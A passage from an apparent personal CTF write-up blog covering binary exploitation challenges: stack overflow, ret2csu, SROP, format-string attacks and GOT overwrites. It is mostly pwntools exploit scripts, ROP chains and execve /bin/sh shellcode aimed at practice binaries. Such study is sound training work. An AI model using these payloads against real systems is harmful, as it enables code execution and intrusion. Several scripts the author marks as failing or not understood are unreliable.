<p>The third stack overflow writes the address where RWX permissions need to be modified into the beginning of the buf, combined with ROP to change the permissions of the given address to RWX, allowing the final shellcode to execute.</p>
<p>Finally, redirect the output to standard error.</p>
<pre><code class="language-python">shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

cross = 0x3fe3c0
leave_ret = 0x401354
chg_rax = 0x401350 # mov rax, qword ptr [rbp - 0x18] ; leave ; ret
mprotect = 0x4012d0

def exploit():
   payload1 = b'a'*0x20 
   p.sendafter('filename\n', payload1)
   payload2 = b'b'*(0x1c-8) + p64(cross-0x10) + p64(cross) + p64(leave_ret)
   p.sendafter('discard\n', payload2)
   payload3 = p64(0x3fe000)*2 + p64(cross+8) + p64(chg_rax) + p64(mprotect) 
   payload3 += p64(0xdeadbeef) + p64(cross+0x28) + shellcode
   p.send(payload3)
</code></pre>
<h2 id="jarvisoj-level5â€”ret2csu2">jarvisoj_level5â€”ret2csu2</h2>
<p>Used a universal gadget to modify registers.</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#ret2csu">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#ret2csu</a></p>
<pre><code class="language-python">csu_front_addr = 0x400690
csu_end_addr = 0x4006AA
fakeebp = b'b' * 8
pop_rdi = 0x4006b3

def csu(rbx, rbp, r12, r13, r14, r15, last):
   # pop rbx,rbp,r12,r13,r14,r15
   # rbx should be 0,
   # rbp should be 1,enable not to jump
   # r12 should be the function we want to call
   # rdi=edi=r15d
   # rsi=r14
   # rdx=r13
   payload = b'a' * 0x80 + fakeebp
   payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
   payload += p64(csu_front_addr)
   payload += b'a' * 0x38
   payload += p64(last)
   p.send(payload)

def exploit():
   write_got = elf.got['write']
   main_addr = elf.symbols['main']

   csu(0, 1, write_got, 8, write_got, 1, main_addr)
   write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
   libc_base = write_addr - libc.symbols['write']
   print(hex(write_addr), hex(libc_base))
   system_addr = libc_base + libc.symbols['system']
   binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
   payload2 = b'a'*0x88 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
   p.sendline(payload2)
</code></pre>
<h2 id="cmcc-pwnme2">cmcc_pwnme2</h2>
<p>Note the <code>exec_string</code> function:</p>
<pre><code class="language-c">int exec_string()
&#123;
  char s; // [esp+Bh] [ebp-Dh] BYREF
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen(&amp;string, &quot;r&quot;);
  if ( !stream )
    perror(&quot;Wrong file&quot;);
  fgets(&amp;s, 50, stream);
  puts(&amp;s);
  fflush(stdout);
  return fclose(stream);
&#125;
</code></pre>
<p>It can redirect the content in <code>string</code> directly to the shellâ€”not sure about the underlying principle.</p>
<pre><code class="language-python">def exploit():
   payload = b'A' * 112 + p32(elf.sym['gets']) + p32(exec_string) + p32(string_addr)
   io.sendline(payload)
   io.sendline('/flag')
</code></pre>
<h2 id="spqrâ€”â€”stack-off-by-null">spqrâ€”â€”stack off by null</h2>
<p>All protections except ASLR are disabled. The <code>vuln</code> function uses a 16-byte buffer with <code>scanf(&quot;%16s&quot;, buf)</code>.</p>
<p>An off-by-null vulnerability can be used to zero the last byte of RBP. If this happens to be the buffer, it is possible to write assembly via <code>ret</code>, and then use the assembly to call <code>sys_read</code>, write shellcode, and <code>jmp</code> into it.</p>
<p>Due to compiler and system differences, it is not possible to construct shellcode shorter than 8 bytes locally, so the exploit did not succeed in the local environment.</p>
<pre><code class="language-python">ret = 0x400406
shellcode2 = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
def exploit():
   shellcode = asm('''
      xchg rdx, rdi; 
      mov rsi, rdx; 
      syscall; 
      jmp rsi
   ''')
   print(len(shellcode)) # the length is 10, it's unable to getshell

   payload = shellcode.ljust(8, b'\0') + p64(ret)

   io.sendline(payload)
   io.sendline(shellcode2)
</code></pre>
<h2 id="Geek-Challenge-not-badâ€”â€”orw-stack-migration">Geek Challenge_not badâ€”â€”orw+stack migration</h2>
<p>General orw code for reading flag:</p>
<pre><code class="language-python">shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
payload = asm(shellcode)
io.send(payload)
</code></pre>
<p>exp:</p>
<pre><code class="language-python">vmmap = 0x123000
jmp_rsp = 0x400a01

def exploit():
   asmcode = asm('''
      xor rax, rax;
      xor rdi, rdi;
      mov rsi, 0x123000;
      mov rdx, 0x1000;
      syscall;
      jmp rsi
   ''')
   payload = asmcode.ljust(40, b'\0') + p64(jmp_rsp)
   payload += asm('''
      sub rsp, 0x30;
      jmp rsp
   ''') # buf(0x20)+rbp(0x8)+ret(0x8)=0x30

   io.send(payload)
   
   shellcode = shellcraft.open('/flag')
   shellcode += shellcraft.read('rax','rsp',100)
   shellcode += shellcraft.write(1,'rsp',100)
   payload = asm(shellcode)
   io.send(payload)
</code></pre>
<h2 id="qwb2019-babymimic">qwb2019_babymimic</h2>
<p>A mimic ROP challenge. The program provides both a 32-bit and a 64-bit file, which perform identical functions, with the only difference being the stack size.</p>
<p>Since it is statically compiled, ropper can be used directly to write the ROP chain.</p>
<p>For payload construction, you can refer to this:</p>
<img src = 'https://p4.ssl.qhimg.com/t019bcf69e463bbb782.png'>
<p>Since the payload is first built for the 64-bit version and then adapted for the 32-bit version, here is the 32-bit execution flow:</p>
<ul>
<li>When the eip reaches the <code>ret</code> instruction in <code>vuln</code>, esp is at 0x10c.</li>
<li>When the eip reaches 0x110, esp is at 0x110.</li>
<li>Next, eip goes to 0x114, and esp becomes 0x110 + 4 + 0x10c = 0x114 + 0x10c.</li>
<li>Next, eip executes <code>pop eax, ret</code>, which is equivalent to <code>pop eax, pop eip</code>. The eip is at [0x118 + 0x10c], and it begins executing the subsequent ROP chain.</li>
</ul>
<pre><code class="language-python">def exploit():
   # 0x10c+4 32bit
   # 0x110+8 64bit
   ret_10c = 0x08099bbe
   pop_eax_ret = 0x80a8af6 # pop_eax_ret == rop[:4]
   payload = b'a'*0x110+p32(ret_10c)+p32(pop_eax_ret)+rop64.ljust(0x10c, b'\0')+rop[4:] 
   io.send(payload)
</code></pre>
<h2 id="rootersctf-2019-srop">rootersctf_2019_srop</h2>
<p>The condition to execute <code>sigreturn</code> is only when <code>rax == 15</code> and a <code>syscall</code> is executed.</p>
<p>You can use the <code>SigreturnFrame()</code> integrated in pwntools to modify specific registers.</p>
<p>In this challenge, the stack is lifted via <code>leave; ret</code> after <code>syscall</code>, setting the <code>buf</code> at a fixed location. In the next input, <code>'/bin/sh\0'</code> is directly written to the specified location, and then <code>sys_execve</code> is called.</p>
<pre><code class="language-python">def exploit():
   syscall = 0x401033
   buf = 0x402000
   pop_rax_syscall = 0x401032

   frame = SigreturnFrame()
   frame.rax = constants.SYS_read
   frame.rdi = 0
   frame.rsi = buf
   frame.rdx = 0x400
   frame.rbp = buf
   frame.rip = syscall

   payload = b'a'*0x88 + p64(pop_rax_syscall) + p64(15) + bytes(frame)
   io.send(payload)

   frame = SigreturnFrame()
   frame.rax = constants.SYS_execve
   frame.rdi = buf + 0x200
   frame.rsi = 0
   frame.rdx = 0
   frame.rip = syscall

   payload = b'a'*8 + p64(pop_rax_syscall) + p64(15) + bytes(frame)
   payload = payload.ljust(0x200, b'\0') + b'/bin/sh\x00'
   io.send(payload)
</code></pre>
<h2 id="360chunqiu2017-smallestâ€”â€”leak-stack-srop">360chunqiu2017_smallestâ€”â€”leak stack+srop</h2>
<p>We can not only control the return value via sys_read to manipulate rdi, but also leak rsp/rbp through sys_write to obtain the stack address.</p>
<p>According to <a target="_blank" rel="noopener" href="https://hackeradam.com/x86-64-linux-syscalls/">https://hackeradam.com/x86-64-linux-syscalls/</a>, the syscall number for write is 1, and the file descriptor for stdout is also 1, making this feasible.</p>
<p>After leaking the stack address, there are several approaches (the latter two are from <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-258047-1.htm">https://bbs.pediy.com/thread-258047-1.htm</a>):</p>
<ul>
<li>(Using one-time srop) Since the stack address is known, but ASLR randomizes the last two or three digits, we can fill the stack with <code>/bin/sh\0</code> and perform srop, writing an arbitrary rdi address for collision. The success probability is approximately 3/16.</li>
<li>(Using two-time srop) After leaking the stack address, perform srop at a specified location to write <code>/bin/sh\0</code>, then use stack pivoting and srop to execute <code>execve('bin/sh', 0, 0)</code>.</li>
<li>(Using two-time srop) After leaking the stack address, perform srop at a specified location to write shellcode, then use srop with mprotect to grant execution permissions to the stack.</li>
</ul>
<p>The following uses the first approach:</p>
<pre><code class="language-python">def exploit():
   io.send(p64(0x4000b0)*3)
   io.send(p8(0xb8)) # rax=1, sys_write
   io.recv(8) 
   stack = u64(io.recv(8)) &amp; 0xfffffffff000
   log.info('stack: ' + hex(stack))
   
   frame=SigreturnFrame()
   frame.rax = constants.SYS_execve
   frame.rdi = stack + 0x520 # random
   frame.rsi = 0
   frame.rdx = 0
   frame.rip = 0x4000be

   io.send(p64(0x4000b0)+p64(0x4000be)+bytes(frame)+b'/bin/sh\0'*95)
   io.send(p64(0x4000be)+bytes(frame)[:7]) # rax=15, sys_rt_sigreturn
</code></pre>
<h1>fmtstr</h1>
<h2 id="xctf-pwn-beginner-4-string">xctf-pwn-(beginner)-4: string</h2>
<p>Format string vulnerabilities. <s>Gradually becoming less beginner-friendly</s></p>
<p>For improperly formatted printf functions, the following exploitation methods are available:</p>
<blockquote>
<p>Skill 1: Using the printf function to view data on the stack:</p>
<p><code>1234-%p-%p-%p-%p-%p-...-%p</code></p>
<p>If this string is printed, all <code>%p</code> placeholders will be replaced by an address.</p>
<p><s>However, I don't know how these addresses relate to the ones seen during IDA debugging</s></p>
<p>Skill 2: Modifying data at corresponding positions:</p>
<p>For example, <code>%85d%7$n</code> changes the <strong>value</strong> at the address corresponding to the 7th <code>%p</code> to 85.</p>
</blockquote>
<p>The core of the problem is how to modify the value of the secret array. Change secret[0] to 85 or secret[1] to 68.</p>
<p>The obvious exploitation points are the two scanf functions asking for address and wish, as well as the improperly formatted printf.</p>
<p>Using the previous stack overflow approach definitely won't work due to the presence of canary.</p>
<p>The solution's approach is to write the address of secret[0] into the first scanf, then use <code>printf('1234-%p-%p-%p-%p-%p-...-%p')</code> and observe that the previously written address appears at the 7th <code>%p</code>. After restarting the program, use <code>printf('%85d%7$n')</code>.</p>
<p>Then, for the spell input part, <code>mmap</code> is a memory mapping function with executable content, so a one-line shellcode is directly used.</p>
<pre><code class="language-python">io.sendline(asm(shellcraft.sh()))
</code></pre>
<h3 id="Alternative-Solution">Alternative Solution</h3>
<p>Through debugging with IDA, it was found that the address of <code>secret</code> in the <code>main</code> function is not far from the non-canonical <code>printf</code>, within 100h.</p>
<p>If you are patient enough, you will find that after inputting 25 <code>%p</code>, the corresponding value is exactly the address of <code>secret</code>, and this value, like the previous 7, does not change. <s>So the previous <code>scanf</code> for inputting the address is completely unnecessary.</s></p>
<p>exp:</p>
<pre><code class="language-python"># ctf.show + buuoj - libc6_2.27
from pwn import*
from LibcSearcher import*
context.arch = 'amd64'
context.log_level = 'debug'

#io = process('./3')
#io = remote('111.200.241.244',64533)

io.recv()
io.sendline('1')
io.recv()
io.sendline('east')
io.recv()
io.sendline('1')
io.recv()
#asking address
io.sendline('1')
io.recvline()
io.sendline('%85d%25$n')
io.recv()
io.sendline(asm(shellcraft.sh()))

io.interactive()
</code></pre>
<h2 id="Fifth-Space-Finals-Pwn5-â€”-fmtstr">Fifth Space Finals Pwn5 â€” fmtstr</h2>
<p>pwntools utility: fmtstr for format string vulnerabilities.</p>
<p><code>fmtstr_payload(offset, &#123;address1: value1&#125;)</code></p>
<p>How to calculate the offset, for example:</p>
<pre><code class="language-c">your name:AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p 
Hello,AAAA-0xffffd0d8-0x63-(nil)-0xf7ffdb30-0x3-0xf7fc3420-0x1-(nil)-0x1-0x41414141-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025
// so the offset is 10
</code></pre>
<p>Exploit using the tool (tested):</p>
<pre><code class="language-python">from pwn import *
#io = process('./pwn')
io = remote('node4.buuoj.cn',27411)
context.log_level = 'debug'
#gdb.attach()

rand_addr = 0x804c044
payload = fmtstr_payload(10, &#123;rand_addr:123456&#125;)
io.recv()
io.sendline(payload)
io.recv()
io.sendline('123456')
io.interactive()
</code></pre>
<p>Exploit without using the tool <s>(though I don't fully understand the underlying details)</s>:</p>
<h3 id="Updated-on-2-25">Updated on 2/25</h3>
<p><code>$n</code> represents the number of bytes successfully output previously, which in this case is four integers, i.e., <code>0x10</code>.</p>
<p>Earlier, we calculated the offset to the input as 10, so starting from <code>%10</code>, we write <code>0x10</code> to the addresses <code>0x804c044</code> to <code>0x804c047</code>.</p>
<p>Therefore, we can satisfy the condition by inputting <code>10101010</code> at the end.</p>
<pre><code class="language-python">from pwn import*

io=remote('node4.buuoj.cn',27411)

payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)
payload+=b'%10$n%11$n%12$n%13$n'

io.sendline(payload)
io.sendline(str(0x10101010))
io.interactive()
</code></pre>
<h2 id="ctfshow-pwn-10-dotaâ€”int-overflow-fmtstr-ret2libc">ctfshow-pwn-10: dotaâ€”int overflow+fmtstr+ret2libc</h2>
<p>The first two issues were straightforward; learning that <code>-2147483648</code> is its own opposite was something I just picked up from CSAPP.</p>
<p>Then came the format string vulnerability. <code>fmtstr_payload</code> threw an error, saying it only works within 32-bit ranges, so I had no choice but to construct it manually.</p>
<p>By manually outputting stack addresses, I determined the offset to be 8.</p>
<p>I was inexperienced at the time and kept trying to place the address of the data I wanted to modify before <code>%25d%9$n</code> or <code>%25c%9$n</code> (why do both work?). Eventually, after checking others' write-ups, I realized it must be placed after, just like in the printf function.</p>
<p>Then came the 64-bit ret2libc3, but I had no idea how others found the address for <code>pop_rdi</code> in their write-ups.</p>
<p>Complete script:</p>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
io = process('./dota.dota')
#io = remote('pwn.challenge.ctf.show', 28085)
context.log_level = 'debug'
elf=ELF('./dota.dota')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.symbols['main']

io.sendline('dota')
io.sendline('-2147483648')
io.recvuntil('Quick question: What is the maximum hero level in dota1?')
io.recv(3)
addr_str = io.recv(14)
addr_str = addr_str[:-1]
rand_addr = int(addr_str,16)

payload = b'%25c%9$n' + p64(rand_addr) # alternative '%25d%9$n'

io.sendline(payload)

pop_rdi = 0x4009b3 #???????
pop_ret = 0x40053e

payload1=b'a'*136+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)

io.recvuntil('\x0a')
io.sendline(payload1)

str_first = io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')
puts_add=u64(str_first)
print(hex(puts_add))

libc=LibcSearcher('puts',puts_add)

libcbase=puts_add-libc.dump('puts')
sys_add=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')

payload2=b'a'*136+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_add)
io.sendline(payload2)
io.interactive()

</code></pre>
<h2 id="fmtstr-ret2libc">fmtstr+ret2libc</h2>
<p>Source code provided:</p>
<pre><code class="language-c">#include&lt;stdio.h&gt;

void main() &#123;
	char str[1024];
	while(1) &#123;
		memset(str, '\0', 1024);
		read(0, str, 1024);
		printf(str);
		fflush(stdout);
    &#125;
&#125;
//gcc -m32 -fno-stack-protector 9.2_fmtdemo4.c -o fmtdemo -g
</code></pre>
<p>Shellcode:</p>
<pre><code class="language-python">from pwn import *
io = process('./fmtdemo')
#io = remote('node4.buuoj.cn',27411)
context.log_level = 'debug'
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('fmtdemo')
#gdb.attach()

printf_got = elf.got['printf'] # 0x80fc010
libc_printf = libc.symbols['printf']
libc_system = libc.symbols['system']

io.sendline(p32(printf_got) + b'%4$s') # *plt = gotï¼Œ *got = real_addr
printf_addr = u32(io.recv()[4:8])
libc_base = printf_addr - printf_got
log.success(&quot;libc_base:&quot;+hex(libc_base))

print(hex(printf_addr))
payload = fmtstr_payload(4, &#123;printf_got:printf_addr-libc_printf+libc_system&#125;)

io.sendline(payload)

io.interactive()

</code></pre>
<h2 id="bjdctf-2020-babyrop2-â€“-ret2libc-fmtstr-canary">bjdctf_2020_babyrop2 â€“ ret2libc + fmtstr + canary</h2>
<p>This serves as a small synthesis in the stack overflow series, utilizing a format string vulnerability to leak the canary value, followed by conventional ROP and 64-bit ret2libc. Overall, the difficulty is not high. (Mainly wanted to share my current code framework, which I personally find quite decent.)</p>
<pre><code class="language-python">from pwn import *
import sys

def exploit():
   puts_plt = elf.plt['puts']
   puts_got = elf.got['puts']
   vuln = elf.sym['vuln']
   pop_rdi = 0x400993
   ret = 0x4005f9

   io.recvuntil('to help u!\n')
   io.sendline('%7$p')
   canary = int(io.recv(18),16)
   log.success('canary--&gt;'+hex(canary))

   io.recvuntil('u story!\n')
   payload1 = b'a'*24 + p64(canary) + p64(0)
   payload1 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
   io.sendline(payload1)
   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\0')) - libc.sym['puts']
   log.success('libc_base--&gt;'+hex(libc_base))

   sys = libc_base + libc.sym['system']
   bin_sh = libc_base + next(libc.search(b'/bin/sh'))

   payload2 = b'a'*24 + p64(canary) + p64(0)
   payload2 += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys)
   io.sendline(payload2) 


if __name__ == &quot;__main__&quot;:
   io = process(sys.argv[1])
   elf = ELF(sys.argv[1])

   if sys.argv.__len__() == 2:
      libc = ELF('/home/junyu33/Desktop/libc/libc.so.6')
   elif sys.argv[2] == 'debug':
      gdb.attach(io, 'b *0x4008d9')
   elif sys.argv[2] == 'remote':
      libc = ELF('/home/junyu33/Desktop/libc/libc-2.23-x64.so')
      io = remote('node4.buuoj.cn', 27078)

   context(arch='amd64', os='linux', log_level='debug')

   #pause()
   exploit()

   io.interactive()
</code></pre>
<h2 id="axb-2019-fmt32">axb_2019_fmt32</h2>
<p>Format string vulnerability with misaligned stack + ret2libc, with a character offset of 8.</p>
<pre><code class="language-python">def exploit():
   io.recvuntil('tell me:')
   payload1 = b'a' + p32(elf.got['puts']) + b'b' + b'%8$s' # 'a' to align the stack, 'b' to identify the address of 'puts'
   io.sendline(payload1)
   io.recvuntil('b')
   puts_addr = u32(io.recv(4))

   libc_base = puts_addr - libc.sym['puts']
   log.success('libc_base--&gt;'+hex(libc_base))
   libc_sys = libc_base + libc.sym['system']

   payload2 = b'a'+fmtstr_payload(8, &#123;elf.got['printf']:libc_sys&#125;, numbwritten=10) # len('repeater:a') = 10
   io.sendafter('tell me:', payload2)
   payload3 = b';/bin/sh\0' # finish the last command and getshell
   io.sendline(payload3)
</code></pre>
<h2 id="buu-n1book-fsb2â€”â€”fmtstr-on-heap">buu-n1book: fsb2â€”â€”fmtstr on heap</h2>
<p>Format string on the heap. Learning reference: <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184717">https://www.anquanke.com/post/id/184717</a></p>
<p>The arbitrary address write script here has been adapted for 64-bit scenarios.</p>
<p>In 64-bit systems, <code>elf_base</code> typically starts with 0x55, while <code>libc_base</code> starts with 0x7f, with the last 12 bits being 0.</p>
<p>This script does not succeed every time for unknown reasons.</p>
<pre><code class="language-python">def write_address(off0,off1,target_addr):
   p.sendline(&quot;%&#123;&#125;$p&quot;.format(off1))
   p.recvuntil(&quot;0x&quot;)
   addr1 = int(p.recv(12),16)&amp;0xff
   p.recv()
   for i in range(6):
      p.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1+i,off0))
      p.recv()
      p.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format((target_addr&amp;0xff)+256,off1))
      p.recv()        
      target_addr=target_addr&gt;&gt;8
   p.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1,off0))
   p.recv()

def exploit():
   p.sendline('%10$p%16$p%20$p%21$p')
   p.recvuntil('hello')
   addr1 = int(p.recv(14), 16) # 10
   addr2 = int(p.recv(14), 16) # 16
   addr3 = int(p.recv(14), 16) # 20
   addr4 = int(p.recv(14), 16) # 21
   # 10-&gt;16-&gt;20
   elf_base = addr3 - elf.sym['__libc_csu_init']
   libc_base = addr4 - libc.sym['__libc_start_main'] - 231 # debug
   elf_free = elf_base + elf.got['free']
   libc_sys = libc_base + libc.sym['system'] 
   
   write_address(10, 16, elf_free)
   write_address(16, 20, libc_sys)
   
   p.sendline(b'/bin/sh\0')
</code></pre>
<blockquote>
<p>update on 2022/10/2:</p>
<p>The original code from the blog post had a minor flaw. Line 9 should be modified to <code>p.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format((target_addr&amp;0xff)+256,off1))</code>; otherwise, modifying a byte to <code>00</code> would fail. (This has been corrected here.)</p>
</blockquote>
<h2 id="axb-2019-fmt64">axb_2019_fmt64</h2>
<p>Python3's type conversion can be a bit of a headache...</p>
<pre><code class="language-python">def exploit():
   io.recvuntil('tell me:')
   payload1 =  b'%9$sAAAA' + p64(elf.got['puts'])
   io.sendline(payload1)

   puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
   libc_base = puts_addr - libc.sym['puts']
   log.success('libc_base--&gt;'+hex(libc_base))
   libc_sys = libc_base + libc.sym['system']

   sys_high = (libc_sys &gt;&gt; 16) &amp; 0xff
   sys_low = libc_sys &amp; 0xffff
   
   # previous output has 9 bytes 
   len1 = bytes(str(sys_high - 9), encoding = 'utf-8')
   len2 = bytes(str(sys_low - sys_high), encoding = 'utf-8')
   payload2 = b&quot;%&quot; + len1 + b&quot;c%12$hhn&quot; # arugment 10, the higher 2 bytes
   payload2 += b&quot;%&quot; + len2 + b&quot;c%13$hn&quot; # argument 11, the last 4 bytes
   payload2 = payload2.ljust(32,b&quot;A&quot;) + p64(elf.got['strlen'] + 2) + p64(elf.got['strlen'])

   io.sendafter('tell me:', payload2)
   payload3 = b';/bin/sh\0'
   io.sendafter('tell me:', payload3)
</code></pre>
<h2 id="ciscn-2019-sw-1â€”â€”fini-array">ciscn_2019_sw_1â€”â€”fini.array</h2>
<blockquote>
<p>The <code>main</code> function only has one opportunity for a format string vulnerability, and stack overflow is prevented.</p>
</blockquote>
<ul>
<li>
<p>During program loading, each function pointer in the <code>init.array</code> is called sequentially, and upon termination, each function pointer in <code>fini.array</code> is called in order.</p>
</li>
<li>
<p>When <code>NO RELRO</code> is enabled, <code>fini.array</code> is writable. Therefore, it is possible to modify the value of <code>fini.array</code> to re-execute the main function.</p>
</li>
</ul>
<pre><code class="language-python">def exploit():
   printf_got = 0x804989c
   system_plt = 0x80483d0
   fini_array = 0x804979c
   main = 0x8048534

   header = p32(printf_got+2) + p32(fini_array+2) + p32(printf_got) + p32(fini_array) # len=0x10
   
   payload = '%' + str(0x804-0x10) + 'c%4$hn'
   payload += '%5$hn'
   payload += '%' + str(0x83d0-0x804) + 'c%6$hn'
   payload += '%' + str(0x8534-0x83d0) + 'c%7$hn'

   payload = header + payload.encode('utf-8')

   io.sendline(payload)
   io.sendline('/bin/sh\0')
</code></pre>
<h2 id="pwnable-fsb-buu-enhanced">pwnable_fsb (buu enhanced)</h2>
<p>The original pwnable challenge was 32-bit without PIE enabled, but the version on buu is 64-bit with PIE enabled, which increases the difficulty.</p>
<p>Use <code>$hhn</code> to write 1 byte, <code>$hn</code> to write 2 bytes, <code>$n</code> to write 4 bytes, and <code>$ln</code> to write 8 bytes.</p>
<p>First, use the first format string to record <code>elf_base</code>, <code>stack_base</code>, and <code>[rbp]</code>.</p>
<p>Then observe the stack and notice that there is no case where three consecutive chains are all stack addresses.</p>
<img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220910104139554.png'>
<p>Observe the address pointed to by <code>rbp</code> (due to stack randomization, we need to use one format string to record <code>[rbp]</code> and calculate the offset from <code>rsp</code>):</p>
<img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220910104432638.png'>
<p>It can be seen that the location <code>[rbp] + 0x18</code> satisfies the requirement of having three chains on the stack. Since <code>**([rbp] + 0x18)</code> is not far from <code>rbp</code>, it can be rewritten in one go. The result is as follows:</p>
<img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220910105202943.png'>
<p>Then, at <code>rbp</code>, change the last 16 bits of <code>__libc_csu_init</code> to the last 16 bits of <code>target_addr</code>. At <code>[rbp] + 0x18</code>, change <code>**([rbp] + 0x18)</code> to <code>**([rbp] + 0x18) + 2</code> to prepare for modifying the middle 8 bits of <code>__libc_csu_init</code>.</p>
<blockquote>
<p>Actually, simply changing <code>**([rbp] + 0x18)</code> to <code>**([rbp] + 0x18) + 2</code> is sufficient; the first step doesn't really have any effect.</p>
</blockquote>
<p>During the third format string, calculate the offset of <code>*([rbp] + 0x18)</code> and change the middle 8 bits of <code>__libc_csu_init</code> to the middle 8 bits of <code>target_addr</code>. At this point, <code>__libc_csu_init</code> becomes <code>key</code>.</p>
<img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220910110401145.png'>
<p>Finally, I attempted to leak the value of <code>key</code> and input it, but the program seems to convert the result of <code>strtoull</code> into an <code>int</code>, making it impossible to match <code>key</code>. So I wrote 0 bytes at <code>key</code> using <code>$ln</code>, but for some unknown reason, <code>key</code> remains 1.</p>
<pre><code class="language-python">from pwn import *
elf_path = './pwn'
libc_path = '/home/junyu33/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so'

def exploit():
   key = 0x202040
   payload = '%14$p%12$p%18$p'
   io.sendline(payload)
   io.recvuntil('0x')
   elf_base = int(io.recv(12), 16) - 0xcb8
   io.recvuntil('0x')
   stack_base = int(io.recv(12), 16)
   io.recvuntil('0x')
   rbp_base = int(io.recv(12), 16)
   log.success('elf_base: ' + hex(elf_base))
   log.success('stack_base: ' + hex(stack_base))
   log.success('rbp_base: ' + hex(rbp_base))

   off0 = ((rbp_base + 0x18 - stack_base) &gt;&gt; 3) + 6
   off1 = off0 + 26
   target_addr = elf_base + key

   payload = &quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format(rbp_base&amp;0xffff, off0)
   payload += &quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format((target_addr-rbp_base)&amp;0xffff, 18)
   payload += &quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format((rbp_base+2-target_addr)&amp;0xffff, off0)
   io.sendline(payload)

   payload = &quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format((target_addr&gt;&gt;16)&amp;0xff, off1)
   payload = payload.ljust(100, '\0')
   io.send(payload)

   io.recvuntil('Give me some format strings(4)\n')
   payload = &quot;%&#123;&#125;c%&#123;&#125;$ln&quot;.format(0, off0-3)
   payload = payload.ljust(100, '\0')
   io.send(payload)
   io.send('1')


if __name__ == '__main__':
   context(arch='amd64', os='linux', log_level='debug')
   io = process(elf_path)
   elf = ELF(elf_path)
   libc = ELF(libc_path)

   if(sys.argv.__len__() &gt; 1):
      if sys.argv[1] == 'debug':
         gdb.attach(io)
      elif sys.argv[1] == 'remote':
         io = remote('node4.buuoj.cn', 25094)
      elif sys.argv[1] == 'ssh':
         shell = ssh('fsb', 'node4.buuoj.cn', 25540, 'guest')
         io = shell.process('./fsb')

   exploit()
   io.interactive()
   io.close()
</code></pre>
<h2 id="wustctf2020-babyfmtâ€”partial-stderr">wustctf2020_babyfmtâ€”partial_stderr</h2>
<p>This challenge has a rather unique approach. Although there is a non-intended solution by <a target="_blank" rel="noopener" href="https://blog.csdn.net/Invin_cible/article/details/124003843">LoÏ„Ï…s</a> modifying the <code>fmt_attack</code> counter.</p>
<p>There is one use of a format string, allowing a one-byte arbitrary address leak once, and initially, <code>scanf(&quot;%ld&quot;)</code> can be used once to input a time.</p>
<p>When the input is not an integer, scanf rejects the input and returns three stack addresses, one of which is related to the ELF base address.</p>
<p>Since the last three bytes of libc are fixed, only the second-to-last byte of <code>stderr</code> needs to be leaked once.</p>
<p>Finally, use the format string to change the second-to-last byte of <code>stdout</code> to the second-to-last byte of <code>stderr</code>, while also changing the lower byte of the secret to <code>\0</code>.</p>
<p><code>fmtstr_payload</code> is still too long (64 &gt; 40), so it's better to do it manually.</p>
<pre><code class="language-python">def exploit():
   io.sendline('1.5')
   io.recvuntil('1:')
   elf_base = int(io.recvuntil(':')[:-1]) - 0xbd5
   stdout = elf_base + 0x202020
   stderr = elf_base + 0x202040
   secret = elf_base + 0x202060

   io.recv()
   leak(p64(stderr+1))
   stderr_1 = u8(io.recvuntil(b'1.')[-3:-2]) * 0x100 + 0x40
   log.info('stderr_1: ' + hex(stderr_1))

   # offset = 8
   payload = &quot;%11$hn%&quot; + str(stderr_1) + 'c%12$hn'
   payload = payload.encode('utf-8')
   payload = payload.ljust(0x18, b'\0') + p64(secret) + p64(stdout)
   fmt(payload)

   getflag('\0'*64)
</code></pre>
<h1>heap</h1>
<h2 id="libc-2-23">libc 2.23</h2>
<h3 id="libc-2-23-UAF">libc 2.23 UAF</h3>
<img src='https://img.junyu33.me/blog/bin_ctf/heap1.png'>
